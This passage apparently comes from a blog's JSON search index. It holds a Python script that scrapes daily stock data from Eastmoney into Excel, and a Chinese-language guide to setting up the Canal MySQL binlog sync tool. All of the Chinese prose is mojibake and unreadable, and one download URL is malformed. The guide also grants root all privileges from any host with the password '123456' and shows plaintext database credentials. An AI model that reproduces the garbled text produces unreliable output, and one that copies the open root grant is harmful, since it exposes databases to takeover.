ï¼Œé€æ¡çˆ¬å–äº¤æ˜“æ•°æ®(å­—æ®µä¸ºæ—¥æœŸã€å¼€ç›˜ä»·ã€æ”¶ç›˜ä»·ã€æœ€é«˜ä»·ã€æœ€ä½ä»·ï¼Œæ¶¨è·Œå¹…ã€æˆäº¤é‡ã€æˆäº¤é¢ã€æŒ¯å¹…ï¼Œæ¢æ‰‹ç‡ç­‰ï¼‰ï¼Œå¹¶è¾“å‡ºä¿å­˜åˆ°xlsä¸­ã€‚é‡‡é›†æ¥æº ä¸œæ–¹è´¢å¯Œç½‘ å®‰è£…äº†å¿…è¦çš„åº“1pip install requests pandas openpyxl 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestsimport pandas as pdfrom datetime import datetime, timedeltadef get_stock_data(stock_code, start_date, days): # å°†è¾“å…¥çš„å­—ç¬¦ä¸²æ—¥æœŸè½¬æ¢ä¸ºdatetimeå¯¹è±¡ start_date = datetime.strptime(start_date, &#x27;%Y-%m-%d&#x27;) end_date = start_date + timedelta(days=days) # æ„å»ºè¯·æ±‚URL url = f&quot;http://push2his.eastmoney.com/api/qt/stock/kline/get?secid=&#123;stock_code&#125;&amp;fields1=f1,f2,f3,f4,f5&amp;fields2=f51,f52,f53,f54,f55,f56,f57,f58,f59,f60,f61&amp;klt=101&amp;fqt=0&amp;beg=&#123;start_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&amp;end=&#123;end_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27; &#125; response = requests.get(url, headers=headers) # æ£€æŸ¥å“åº”çŠ¶æ€ç  if response.status_code != 200: raise Exception(f&quot;Request failed with status code &#123;response.status_code&#125;&quot;) data = response.json() # æ‰“å°å“åº”å†…å®¹ï¼Œä»¥ä¾¿è°ƒè¯• print(&quot;Response content:&quot;) print(data) if &#x27;rc&#x27; not in data or data[&#x27;rc&#x27;] != 0: raise Exception(f&quot;Error fetching data: &#123;data.get(&#x27;rt&#x27;, &#x27;Unknown error&#x27;)&#125;&quot;) klines = data[&#x27;data&#x27;][&#x27;klines&#x27;] # è§£ææ•°æ® records = [] for line in klines: parts = line.split(&#x27;,&#x27;) record = &#123; &#x27;æ—¥æœŸ&#x27;: parts[0], &#x27;å¼€ç›˜ä»·&#x27;: float(parts[1]), &#x27;æ”¶ç›˜ä»·&#x27;: float(parts[2]), &#x27;æœ€é«˜ä»·&#x27;: float(parts[3]), &#x27;æœ€ä½ä»·&#x27;: float(parts[4]), &#x27;æ¶¨è·Œå¹…&#x27;: float(parts[8]), &#x27;æˆäº¤é‡&#x27;: int(parts[5]), &#x27;æˆäº¤é¢&#x27;: float(parts[6]), &#x27;æŒ¯å¹…&#x27;: float(parts[9]), &#x27;æ¢æ‰‹ç‡&#x27;: float(parts[10]) &#125; records.append(record) df = pd.DataFrame(records) return dfdef save_to_excel(df, filename): df.to_excel(filename, index=False)if __name__ == &quot;__main__&quot;: stock_code = &quot;1.600519&quot; # ç¤ºä¾‹è‚¡ç¥¨ä»£ç ï¼Œå‰ç¼€1è¡¨ç¤ºä¸Šæµ·Aè‚¡ start_date = &quot;2024-10-01&quot; days = 30 # è·å–30ä¸ªäº¤æ˜“æ—¥çš„æ•°æ® try: df = get_stock_data(stock_code, start_date, days) save_to_excel(df, &quot;stock_data.xlsx&quot;) print(&quot;Data saved to stock_data.xlsx&quot;) except Exception as e: print(f&quot;Error: &#123;e&#125;&quot;) åŠ å…¥ æ¸¯è‚¡ ä»£ç è‡ªåŠ¨è¯†åˆ«è‚¡ç¥¨å¸‚åœºï¼šæ ¹æ®è‚¡ç¥¨ä»£ç çš„é•¿åº¦åˆ¤æ–­æ˜¯æ¸¯è‚¡è¿˜æ˜¯å¤§é™†è‚¡ç¥¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293import requestsimport pandas as pdfrom datetime import datetime, timedeltaimport timeimport calendardef is_weekend(date_str): year, month, day = map(int, date_str.split(&#x27;-&#x27;)) return calendar.weekday(year, month, day) &gt;= 5 # 5æ˜¯å‘¨å…­ï¼Œ6æ˜¯å‘¨æ—¥def get_stock_data(stock_code, start_date, days, retries=3, delay=1): # å°†è¾“å…¥çš„å­—ç¬¦ä¸²æ—¥æœŸè½¬æ¢ä¸ºdatetimeå¯¹è±¡ start_date = datetime.strptime(start_date, &#x27;%Y-%m-%d&#x27;) end_date = start_date + timedelta(days=days) # æ ¹æ®è‚¡ç¥¨ä»£ç é•¿åº¦è¯†åˆ«å¸‚åœº if len(stock_code) == 5: market = &#x27;HK&#x27; secid = f&quot;116.&#123;stock_code&#125;&quot; # ä¸œæ–¹è´¢å¯Œç½‘æ¸¯è‚¡ä»£ç å‰ç¼€ elif len(stock_code) == 6: market = &#x27;SH&#x27; if stock_code.startswith(&#x27;6&#x27;) else &#x27;SZ&#x27; secid = f&quot;&#123;market&#125;.&#123;stock_code&#125;&quot; else: raise ValueError(&quot;Invalid stock code length. Stock code should be 5 digits for HK stocks and 6 digits for mainland stocks.&quot;) # æ„å»ºè¯·æ±‚URL url = f&quot;http://push2his.eastmoney.com/api/qt/stock/kline/get?secid=&#123;secid&#125;&amp;fields1=f1,f2,f3,f4,f5&amp;fields2=f51,f52,f53,f54,f55,f56,f57,f58,f59,f60,f61&amp;klt=101&amp;fqt=0&amp;beg=&#123;start_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&amp;end=&#123;end_date.strftime(&#x27;%Y%m%d&#x27;)&#125;&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27; &#125; for attempt in range(retries): response = requests.get(url, headers=headers) # æ£€æŸ¥å“åº”çŠ¶æ€ç  if response.status_code != 200: if attempt &lt; retries - 1: time.sleep(delay) continue else: raise Exception(f&quot;Request failed with status code &#123;response.status_code&#125;&quot;) data = response.json() # æ‰“å°å“åº”å†…å®¹ï¼Œä»¥ä¾¿è°ƒè¯• print(&quot;Response content:&quot;) print(data) if &#x27;rc&#x27; not in data or data[&#x27;rc&#x27;] != 0: if attempt &lt; retries - 1: time.sleep(delay) continue else: raise Exception(f&quot;Error fetching data: &#123;data.get(&#x27;rt&#x27;, &#x27;Unknown error&#x27;)&#125;&quot;) klines = data[&#x27;data&#x27;][&#x27;klines&#x27;] # è§£ææ•°æ® records = [] for line in klines: parts = line.split(&#x27;,&#x27;) record = &#123; &#x27;æ—¥æœŸ&#x27;: parts[0], &#x27;å¼€ç›˜ä»·&#x27;: float(parts[1]), &#x27;æ”¶ç›˜ä»·&#x27;: float(parts[2]), &#x27;æœ€é«˜ä»·&#x27;: float(parts[3]), &#x27;æœ€ä½ä»·&#x27;: float(parts[4]), &#x27;æ¶¨è·Œå¹…&#x27;: float(parts[8]), &#x27;æˆäº¤é‡&#x27;: int(parts[5]), &#x27;æˆäº¤é¢&#x27;: float(parts[6]), &#x27;æŒ¯å¹…&#x27;: float(parts[9]), &#x27;æ¢æ‰‹ç‡&#x27;: float(parts[10]) &#125; records.append(record) df = pd.DataFrame(records) return dfdef save_to_excel(df, filename): df.to_excel(filename, index=False)if __name__ == &quot;__main__&quot;: stock_code = &quot;09999&quot; # ç¤ºä¾‹è‚¡ç¥¨ä»£ç ï¼Œäº”ä½è¡¨ç¤ºæ¸¯è‚¡ start_date = &quot;2024-10-01&quot; days = 30 # è·å–30ä¸ªäº¤æ˜“æ—¥çš„æ•°æ® try: df = get_stock_data(stock_code, start_date, days, retries=5, delay=2) save_to_excel(df, &quot;%s_%s_%d.xlsx&quot; % (stock_code, start_date,days)) print(&quot;Data saved to &quot;+&quot;%s_%s_%d.xlsx&quot; % (stock_code, start_date,days) ) except Exception as e: print(f&quot;Error: &#123;e&#125;&quot;)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"python","slug":"python","permalink":"https://banjinmei.github.io/tags/python/"}],"author":"mu"},{"title":"canal mysql auto bak","slug":"canal-mysql-auto-bak","date":"2024-11-17T15:28:55.000Z","updated":"2024-11-21T13:08:16.265Z","comments":true,"path":"2024/11/17/canal-mysql-auto-bak/","permalink":"https://banjinmei.github.io/2024/11/17/canal-mysql-auto-bak/","excerpt":"","text":"Canalæ˜¯é˜¿é‡Œå·´å·´å¼€æºçš„ä¸€ä¸ªæ•°æ®åº“binlogè§£æå·¥å…·ï¼Œå®ƒèƒ½å¤Ÿæ•è·å¹¶è§£æMySQLç­‰æ•°æ®åº“çš„å¢é‡æ•°æ®å˜åŒ–ï¼ˆå³binlogï¼‰ï¼Œç„¶åå°†è¿™äº›å˜åŒ–çš„æ•°æ®ä»¥æ¶ˆæ¯çš„å½¢å¼å‘é€ç»™å…¶ä»–ç³»ç»Ÿæˆ–æœåŠ¡ï¼Œå¦‚Elasticsearchã€HBaseã€Redisç­‰ã€‚è¿™æ ·åšçš„å¥½å¤„æ˜¯å¯ä»¥å®ç°æ•°æ®çš„å®æ—¶åŒæ­¥ï¼Œä¿è¯ä¸åŒå­˜å‚¨ç³»ç»Ÿä¹‹é—´çš„æ•°æ®ä¸€è‡´æ€§ã€‚ Canalçš„è®¾è®¡ç†å¿µä¸»è¦æ˜¯åŸºäºæ•°æ®åº“çš„å¢é‡è®¢é˜…ä¸æ¶ˆè´¹æ¨¡å¼ï¼Œå®ƒé€šè¿‡æ¨¡æ‹ŸMySQLçš„slaveæ¥å®ç°å¯¹MySQLä¸»åº“binlogçš„ç›‘å¬ï¼Œå½“ä¸»åº“æœ‰æ•°æ®æ›´æ–°æ—¶ï¼ŒCanalèƒ½åŠæ—¶æ•æ‰åˆ°è¿™äº›å˜åŒ–ï¼Œå¹¶å°†å˜åŒ–çš„æ•°æ®æŒ‰ç…§ä¸€å®šçš„æ ¼å¼è¾“å‡ºï¼Œä¾›ä¸‹æ¸¸ç³»ç»Ÿæ¶ˆè´¹ä½¿ç”¨ã€‚ ä½¿ç”¨Canalçš„ä¸»è¦ä¼˜åŠ¿åŒ…æ‹¬ï¼šå®æ—¶æ€§Canalé€šè¿‡æ¨¡ä»¿MySQLçš„slaveèŠ‚ç‚¹è¡Œä¸ºï¼Œå‘MySQL masterèŠ‚ç‚¹å‘é€dumpåè®®è¯·æ±‚ï¼Œä»¥è·å–binlogæ—¥å¿—8ã€‚è¿™ç§æ–¹æ³•ä½¿å¾—Canalèƒ½å¤Ÿä»¥è¾ƒä½çš„å»¶è¿Ÿæ•è·åˆ°æ•°æ®åº“çš„å˜åŒ–ï¼Œä»è€Œå®ç°å®æ—¶çš„æ•°æ®åŒæ­¥ã€‚å¯¹äºéœ€è¦ä¿æŒæ•°æ®æœ€æ–°æ€§çš„åº”ç”¨åœºæ™¯ï¼Œå¦‚æœç´¢å¼•æ“çš„ç´¢å¼•æ›´æ–°æˆ–ç¼“å­˜ç³»ç»Ÿçš„æ•°æ®åˆ·æ–°ï¼Œè¿™ä¸€ç‰¹æ€§å°¤ä¸ºé‡è¦ã€‚ è§£è€¦Canalä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„æœåŠ¡ï¼Œå……å½“äº†æ•°æ®åº“å’Œæ•°æ®æ¶ˆè´¹è€…ä¹‹é—´çš„ä¸­ä»‹è§’è‰²ã€‚å®ƒä¸ä»…å‡å°‘äº†ç›´æ¥è¿æ¥æ•°æ®åº“å¸¦æ¥çš„æ€§èƒ½å‹åŠ›ï¼Œè¿˜é¿å…äº†å› æ•°æ®åº“ç»“æ„æˆ–æ•°æ®æ¨¡å‹å˜æ›´å¯¼è‡´çš„ä¸‹æ¸¸ç³»ç»Ÿé€‚é…é—®é¢˜ã€‚è¿™ç§è§£è€¦æœºåˆ¶å¢å¼ºäº†ç³»ç»Ÿçš„çµæ´»æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œä½¿å¾—å„ä¸ªç»„ä»¶å¯ä»¥ç‹¬ç«‹å‘å±•è€Œä¸ç›¸äº’å¹²æ‰°18ã€‚ çµæ´»æ€§Canalæ”¯æŒå¤šç§æ•°æ®è¾“å‡ºæ ¼å¼ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºJSONã€XMLç­‰ï¼Œè¿™ä½¿å¾—å®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°ä¸å…¶ä»–æ•°æ®å¤„ç†å·¥å…·å’ŒæœåŠ¡é›†æˆã€‚æ­¤å¤–ï¼ŒCanalè¿˜æä¾›äº†å¯¹Kafkaã€RocketMQç­‰æ¶ˆæ¯é˜Ÿåˆ—çš„æ”¯æŒï¼Œè¿™æ„å‘³ç€æ•°æ®ä¸ä»…å¯ä»¥è¢«åŒæ­¥åˆ°ä¸åŒçš„å­˜å‚¨ç³»ç»Ÿï¼Œè¿˜å¯ä»¥è¢«å‘é€åˆ°æ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œä¾›æ›´å¤šçš„åº”ç”¨å’ŒæœåŠ¡æ¶ˆè´¹14ã€‚ é™¤äº†ä¸Šè¿°æåˆ°çš„ä¼˜ç‚¹å¤–ï¼ŒCanalè¿˜å…·å¤‡ä»¥ä¸‹ç‰¹ç‚¹ï¼š é«˜æ€§èƒ½ï¼šç»è¿‡ä¼˜åŒ–çš„Canalèƒ½å¤Ÿåœ¨é«˜å¹¶å‘ç¯å¢ƒä¸‹ä¿æŒç¨³å®šçš„æ€§èƒ½è¡¨ç°ï¼Œé€‚åˆå¤§è§„æ¨¡æ•°æ®åŒæ­¥åœºæ™¯ã€‚ä½å»¶è¿Ÿï¼šé€šè¿‡é«˜æ•ˆçš„æ—¥å¿—è§£æå’Œæ•°æ®ä¼ è¾“æœºåˆ¶ï¼ŒCanalèƒ½å¤Ÿç¡®ä¿æ•°æ®ä»æºå¤´åˆ°ç›®çš„åœ°çš„ä¼ è¾“å»¶è¿Ÿå°½å¯èƒ½ä½ã€‚é«˜å¯ç”¨æ€§ï¼šCanalæ”¯æŒé›†ç¾¤éƒ¨ç½²ï¼Œç»“åˆZookeeperç­‰åè°ƒæœåŠ¡ï¼Œå¯ä»¥å®ç°æ•…éšœè‡ªåŠ¨åˆ‡æ¢ï¼Œä¿è¯æœåŠ¡çš„è¿ç»­æ€§å’Œç¨³å®šæ€§21ã€‚å®‰å…¨æ€§ï¼šCanalå¯ä»¥é€šè¿‡é…ç½®SSL&#x2F;TLSåŠ å¯†é€šä¿¡ï¼Œä¿æŠ¤æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„å®‰å…¨18ã€‚ åº”ç”¨åœºæ™¯Canalçš„åº”ç”¨åœºæ™¯éå¸¸å¹¿æ³›ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š æ•°æ®åŒæ­¥ï¼šå°†MySQLæ•°æ®åº“çš„æ•°æ®åŒæ­¥åˆ°Elasticsearchã€Redisç­‰å…¶ä»–å­˜å‚¨ç³»ç»Ÿï¼Œç”¨äºæ„å»ºæœç´¢å¼•æ“ã€ç¼“å­˜å±‚ç­‰18ã€‚æ•°æ®å¤‡ä»½ï¼šå®šæœŸæˆ–å®æ—¶å¤‡ä»½MySQLæ•°æ®åº“çš„æ•°æ®ï¼Œç”¨äºç¾éš¾æ¢å¤æˆ–æ•°æ®å½’æ¡£18ã€‚æ•°æ®é›†æˆï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œä½¿ç”¨Canalå°†å¤šä¸ªæ•°æ®åº“ä¸­çš„æ•°æ®è¿›è¡Œé›†æˆï¼Œæä¾›ç»Ÿä¸€çš„æ•°æ®è§†å›¾18ã€‚æ•°æ®ç›‘æ§ï¼šé€šè¿‡ç›‘å¬æ•°æ®åº“çš„å˜åŒ–ï¼ŒåŠæ—¶å‘ç°å¼‚å¸¸æ“ä½œæˆ–æ½œåœ¨çš„å®‰å…¨é£é™©18ã€‚Canalæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ã€çµæ´»å¤šå˜çš„æ•°æ®åŒæ­¥å·¥å…·ï¼Œå®ƒåœ¨ä¿è¯æ•°æ®å®æ—¶æ€§å’Œä¸€è‡´æ€§çš„åŸºç¡€ä¸Šï¼Œæä¾›äº†ä¸°å¯Œçš„ç‰¹æ€§å’Œå¹¿æ³›çš„åº”ç”¨åœºæ™¯ï¼Œæ˜¯ç°ä»£æ•°æ®é©±åŠ¨åº”ç”¨çš„ç†æƒ³é€‰æ‹©ã€‚ Canalç¯å¢ƒå‡†å¤‡è®¾ç½®MySQLè¿œç¨‹è®¿é—® 12grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;flush privileges; MySQLé…ç½® Canalçš„åŸç†åŸºäºMySQL binlogæŠ€æœ¯ï¼Œæ‰€ä»¥ï¼Œè¦æƒ³ä½¿ç”¨Canalå°±è¦å¼€å¯MySQLçš„binlogå†™å…¥åŠŸèƒ½ï¼Œå»ºè®®é…ç½®binlogçš„æ¨¡å¼ä¸ºrowã€‚ å¯ä»¥åœ¨MySQLå‘½ä»¤è¡Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹binlogçš„æ¨¡å¼ã€‚ 1SHOW VARIABLES LIKE &#x27;binlog_format&#x27;; å¦‚æœMySQLä¸­é»˜è®¤çš„binlogæ ¼å¼ä¸ºSTATEMENTï¼Œéœ€è¦å°†STATEMENTä¿®æ”¹ä¸ºROWã€‚ä¿®æ”¹&#x2F;etc&#x2F;my.cnfæ–‡ä»¶ã€‚ &#x2F;etc&#x2F;my.cnfåœ¨[mysqld]ä¸‹é¢æ–°å¢å¦‚ä¸‹ä¸‰é¡¹é…ç½®ã€‚ 123log-bin=mysql-bin #å¼€å¯MySQLäºŒè¿›åˆ¶æ—¥å¿—binlog_format=ROW #å°†äºŒè¿›åˆ¶æ—¥å¿—çš„æ ¼å¼è®¾ç½®ä¸ºROWserver_id=1 #server_idéœ€è¦å”¯ä¸€ï¼Œä¸èƒ½ä¸Canalçš„slaveIdé‡å¤ ä¿®æ”¹å®Œmy.cnfæ–‡ä»¶åï¼Œéœ€è¦é‡å¯MySQLæœåŠ¡ã€‚ 1service mysqld restart å†æ¬¡æŸ¥çœ‹binlogæ¨¡å¼ã€‚ 1SHOW VARIABLES LIKE &#x27;binlog_format&#x27;; MySQLåˆ›å»ºç”¨æˆ·æˆæƒ Canalçš„åŸç†æ˜¯æ¨¡å¼è‡ªå·±ä¸ºMySQL Slaveï¼Œæ‰€ä»¥ä¸€å®šè¦è®¾ç½®MySQL Slaveçš„ç›¸å…³æƒé™ã€‚è¿™é‡Œï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªä¸»ä»åŒæ­¥çš„è´¦æˆ·ï¼Œå¹¶ä¸”èµ‹äºˆè¿™ä¸ªè´¦æˆ·ç›¸å…³çš„æƒé™ã€‚ 123CREATE USER canal@&#x27;localhost&#x27; IDENTIFIED BY &#x27;canal&#x27;;GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#x27;canal&#x27;@&#x27;localhost&#x27;;FLUSH PRIVILEGES; æœåŠ¡å™¨ä¿¡æ¯124.219.119.2xx ä¸»åº“æ‰€åœ¨æœåŠ¡å™¨ 192.168.80.203 canalæ•°æ®åŒæ­¥æ‰€åœ¨æœåŠ¡å™¨ è¿æ¥ä¸»åº“æ‰€åœ¨æœåŠ¡å™¨åˆ‡æ¢ root è´¦å·su root å¯åŠ¨MySQL8.0æ•°æ®åº“systemctl start mysqld.service åˆ›å»ºå¤åˆ¶è´¦å·å’Œå¯†ç è¿æ¥ä¸»åº“æ‰€åœ¨æœåŠ¡å™¨ï¼Œå³ï¼š192.168.91.131ï¼Œè¿è¡ŒMySQL 8.0æ•°æ®åº“ï¼Œåˆ›å»ºå¤åˆ¶è´¦å·å’Œå¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 123mysql&gt; CREATE USER canal IDENTIFIED BY &#x27;canal&#x27;; mysql&gt; GRANT SELECT, SHOW VIEW, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#x27;canal&#x27;@&#x27;%&#x27;;mysql&gt; FLUSH PRIVILEGES; canalæ•°æ®åŒæ­¥æœåŠ¡å™¨æ“ä½œåˆ›å»ºcanalæ–‡ä»¶å¤¹1234cd /usr/localmkdir canalcd canalmkdir canal-package canal-adapter canal-deployer å®‰è£…canal deployerå’Œcanal adapter1234cd canal-packagewget https://github.com/alibaba/canal/releases/download/canal-1.1.8canal.deployer-1.1.8.tar.gzwget https://github.com/alibaba/canal/releases/download/canal-1.1.8/canal.adapter-1.1.8.tar.gz tar -zxvf canal.adapter.tar.gz -C &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-adaptertar -zxvf canal.deployer.tar.gz -C &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer github:https://github.com/alibaba/canal/releases?page=1 é…ç½®å’Œå¯åŠ¨canal-deployeré…ç½®canal-deployerç”±äºæ­¤æ¬¡åŒæ­¥ä¸ºMySQLæ•°æ®åº“é—´çš„æ•°æ®åŒæ­¥ï¼Œæ‰€ä»¥æ­¤å¤„ä¸éœ€è¦ä¿®æ”¹ canal.properties é…ç½®æ–‡ä»¶ï¼Œåªéœ€ä¿®æ”¹ instance.properties å³å¯ 12cd /usr/local/canal/canal-deployer/conf/examplevi instance.properties 12345678910# position infocanal.instance.master.address= xxx# username/passwordcanal.instance.dbUsername=rootcanal.instance.dbPassword=123123# table regexcanal.instance.filter.regex=.*\\\\..* è¯´æ˜ canal.idï¼šè®¾ç½®Canalå®ä¾‹çš„å”¯ä¸€IDï¼Œå»ºè®®ä½¿ç”¨UUIDã€‚ canal.ipï¼šè®¾ç½®Canalå®ä¾‹çš„IPåœ°å€ã€‚ canal.portï¼šè®¾ç½®Canalå®ä¾‹çš„ç«¯å£å·ã€‚ canal.destinationsï¼šè®¾ç½®Canalå®ä¾‹è¦è¿æ¥çš„ç›®æ ‡æ•°æ®åº“åœ°å€å’Œç«¯å£å·ï¼Œæ ¼å¼ä¸º&lt;åè®®ï¼š&#x2F;&#x2F;ç”¨æˆ·åï¼šå¯†ç @IPåœ°å€ï¼šç«¯å£å·&#x2F;æ•°æ®åº“åã€‚ canal.usernameï¼šè®¾ç½®è¿æ¥ç›®æ ‡æ•°æ®åº“çš„ç”¨æˆ·åã€‚ canal.passwordï¼šè®¾ç½®è¿æ¥ç›®æ ‡æ•°æ®åº“çš„å¯†ç ã€‚ canal.driverClassNameï¼šè®¾ç½®è¿æ¥ç›®æ ‡æ•°æ®åº“çš„é©±åŠ¨ç±»åï¼Œä¾‹å¦‚oracle.jdbc.driver.OracleDriverã€‚ canal.connectionCharsetï¼šè®¾ç½®è¿æ¥ç›®æ ‡æ•°æ®åº“çš„å­—ç¬¦é›†ï¼Œä¾‹å¦‚UTF8ã€‚ å¯èƒ½é‡åˆ°çš„é—®é¢˜ï¼šcanal-deployerå¯åŠ¨ä¹‹åï¼Œå¦‚æœåœ¨ logs æ–‡ä»¶å¤¹ä¸‹æ²¡æœ‰ example æ–‡ä»¶ï¼Œå‚è€ƒå¦‚ä¸‹æƒ…å†µè¯´æ˜ï¼š æŸ¥çœ‹ &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer&#x2F;bin æ–‡ä»¶å¤¹ä¸‹ï¼Œæ˜¯å¦å­˜åœ¨ä»¥hs_err_pidå¼€å¤´çš„æ–‡ä»¶ã€‚å‡ºç°hs_err_pidå¼€å¤´çš„æ–‡ä»¶ï¼Œä¸»è¦åŸå› æœ‰ä¸¤ä¸ªï¼š1&gt; æœåŠ¡å™¨å†…å­˜ä¸è¶³ï¼Œå¯¼è‡´æœåŠ¡å¯åŠ¨å¤±è´¥ï¼Œå‡ºç°OOMé—®é¢˜ï¼Œè¿™æ—¶éœ€è¦å¢åŠ æœåŠ¡å™¨å†…å­˜2&gt; æœåŠ¡å™¨æ‰“å¼€çš„çº¿ç¨‹æ•°è¾¾åˆ°ä¸Šé™ï¼Œè¿™æ—¶éœ€è¦ä¿®æ”¹çº¿ç¨‹ä¸Šé™ï¼Œæ“ä½œå¦‚ä¸‹ï¼švi &#x2F;etc&#x2F;security&#x2F;limits.conf ä¿®æ”¹å†…å®¹å¯å‚è€ƒä¸‹é¢é…ç½®ï¼š soft nproc 102400 hard nofile 102400 ä¸Šè¿°é…ç½®å‚æ•°è¯´æ˜ï¼šç¬¬ä¸€åˆ—ï¼šlinuxç³»ç»Ÿç”¨æˆ·åï¼Œ*ä»£è¡¨æ‰€æœ‰ç”¨æˆ·ç¬¬äºŒåˆ—ï¼šè½¯è¿æ¥&#x2F;ç¡¬è¿æ¥ç¬¬ä¸‰åˆ—ï¼šç±»å‹ï¼Œnproc è¿›ç¨‹çš„æ•°é‡&#x2F;nofile æ–‡ä»¶æ‰“å¼€æ•°&#x2F;core-core æ–‡ä»¶å¤§å°ç¬¬å››åˆ—ï¼šæ•°é‡ binæ–‡ä»¶å¤¹ä¸‹ä¸å­˜åœ¨ä»¥hs_err_pidå¼€å¤´çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹logsæ–‡ä»¶å¤¹ä¸‹çš„canalæ–‡ä»¶å¤¹ä¸‹çš„canal_stdout.logæ–‡ä»¶ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼šcat &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer&#x2F;logs&#x2F;canal&#x2F;canal_stdout.log è‹¥å‡ºç°å¦‚ä¸‹æŠ¥é”™ä¿¡æ¯ï¼š OpenJDK 64-Bit Server VM warning: Ignoring option PermSize; support was removed in 8.0OpenJDK 64-Bit Server VM warning: Ignoring option MaxPermSize; support was removed in 8.0OpenJDK 64-Bit Server VM warning: Option UseConcMarkSweepGC was deprecated in version 9.0 and will likely be removed in a future release. Unrecognized VM option â€˜UseCMSCompactAtFullCollectionâ€™Error: Could not create the Java Virtual Machine.Error: A fatal exception has occurred. Program will exit. å‡ºç°æ­¤æŠ¥é”™çš„åŸå› æ˜¯ç”±äºå½“å‰æœåŠ¡å™¨å®‰è£…çš„jdkç‰ˆæœ¬é«˜äºjdk8ï¼Œæ­¤æ—¶éœ€è¦ä¿®æ”¹ startup.sh çš„å¯åŠ¨å‚æ•°ï¼Œæ“ä½œå¦‚ä¸‹ï¼š cd &#x2F;usr&#x2F;local&#x2F;canal&#x2F;canal-deployer&#x2F;bin.&#x2F;stop.shvi startup.sh åˆ é™¤ -XX:+UseCMSCompactAtFullCollection -XX:+UseFastAccessorMethods å‚æ•°.&#x2F;startup.sh Unrecognized VM option â€˜UseBiasedLockingâ€™Error: Could not create the Java Virtual Machine.Error: A fatal exception has occurred. Program will exit. ç§»é™¤ UseBiasedLocking é€‰é¡¹-XX:+UseBiasedLocking Unrecognized VM option â€˜AggressiveOptsâ€™Error: Could not create the Java Virtual Machine.Error: A fatal exception has occurred. Program will exit. Remove -XX:+AggressiveOptscanal.deployer-1.1.8-SNAPSHOT.tar.gz com.alibaba.druid.pool.DruidDataSource ç±»æœªæ‰¾åˆ°ï¼Œå¯¼è‡´ Canal çš„ dataSource bean åˆå§‹åŒ–å¤±è´¥ã€‚ .&#x2F;startup.sh è‹¥éœ€è¦åŒæ­¥æŸå‡ å¼ è¡¨ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹é…ç½®åŒæ­¥æŸæ•°æ®åº“test1ä¸‹çš„userè¡¨,test2æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨ï¼Œæ‰€æœ‰åº“ä¸‹æ‰€æœ‰è¡¨æ•°æ®1canal.instance.filter.regex=test1.user,test2\\\\..*,.*\\\\..* å¯åŠ¨canal-deployer12cd /usr/local/canal/canal-deployer/bin./startup.sh æŸ¥çœ‹æ—¥å¿—ç¡®å®šæ˜¯å¦å¯åŠ¨æˆåŠŸ 12cd /usr/local/canal/canal-deployer/logs/examplecat example.log logå†…å®¹â€¦ [main] INFO c.a.otter.canal.instance.core.AbstractCanalInstance - stop CannalInstance for null-example [main] INFO c.a.otter.canal.instance.core.AbstractCanalInstance - stop successfulâ€¦.å¯åŠ¨ å¯åŠ¨canaléœ€è¦jdkå®‰è£… OpenJDK 1234567sudo apt updateapt search openjdksudo apt install openjdk-17-jdksudo apt install -y openjdk-17-jdk æ‰‹åŠ¨ä¸‹è½½å¹¶å®‰è£…å‰å¾€ Oracle JDK ä¸‹è½½é¡µé¢ï¼Œä¸‹è½½æœ€æ–°çš„ .tar.gz åŒ…ã€‚https://www.oracle.com/java/technologies/downloads/?er=221886ä¸‹è½½å®Œæˆåï¼Œè§£å‹ç¼©æ–‡ä»¶ï¼š 1tar -xvzf jdk-&lt;version&gt;-linux-x64_bin.tar.gz å°† JDK ç§»åŠ¨åˆ° &#x2F;opt ç›®å½•ï¼š 1sudo mv jdk-&lt;version&gt; /opt/ é…ç½®ç¯å¢ƒå˜é‡ã€‚åœ¨ ~&#x2F;.bashrc ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š 12export JAVA_HOME=/opt/jdk-&lt;version&gt;export PATH=$JAVA_HOME/bin:$PATH ä½¿é…ç½®ç”Ÿæ•ˆï¼š 1source ~/.bashrc éªŒè¯å®‰è£…,ç¡®è®¤å®‰è£…æˆåŠŸï¼Œæ£€æŸ¥ Java ç‰ˆæœ¬ï¼š 1java -version å¸è½½jdk 